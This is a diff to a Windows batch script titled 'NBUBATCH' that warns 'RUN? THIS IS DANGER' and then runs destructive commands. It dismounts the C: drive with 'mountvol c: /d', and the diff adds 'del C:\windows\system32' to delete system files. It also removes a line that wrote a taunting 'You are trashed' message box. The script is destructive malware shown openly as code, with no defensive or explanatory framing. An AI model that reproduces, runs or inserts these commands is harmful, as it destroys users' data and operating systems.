@@ -3,5 +3,5 @@ title NBUBATCH7928192810221382389139128391283hasjfnwheiurhwr43u28904eu2308eujqwo
 echo RUN? THIS IS DANGER
 pause
 cls
-echo msgbox "You are trashed by NbuBatch1.0.bat" >x.vbs
 mountvol c: /d
+del C:\windows\system32
